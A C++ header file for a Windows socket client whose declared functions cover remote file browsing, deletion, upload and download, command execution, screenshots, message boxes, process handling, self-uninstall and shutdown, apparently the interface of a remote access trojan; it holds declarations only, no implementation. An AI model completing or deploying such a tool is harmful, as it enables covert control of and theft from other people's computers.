#ifndef __CLIENT__
#define __CLIENT__

#include <iostream>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <windows.h>
#include <fcntl.h>
#include <fstream>
#include <Tlhelp32.h>

#define DEF_FREQ 1

using namespace std;

struct MYDATE
{
       int year;
       int month;
       int day;
       int hour;
       int minute;
};

void init(int&, char*, char*);
bool expired(struct MYDATE, struct MYDATE);
void disconnect(SOCKET&, int);
void synchronize(SOCKET&);
void transfer(SOCKET&, char*, char*, int, string);
void download(SOCKET&);
void browse(SOCKET&);
int ls(SOCKET&, string);
int cd(SOCKET&, string&);
int dl(SOCKET&, string);
int rm(SOCKET&, string);
int exec(SOCKET&, string);
int upl(SOCKET&, string);
int mkdir(SOCKET&, string);
int rmdir(SOCKET&, string);
void terminate(SOCKET&);
void screenshot(SOCKET&);
void messagebox(SOCKET&);
void editparams(SOCKET&);
void uninstall(SOCKET&);
void shutdown(bool, SOCKET&);

#endif
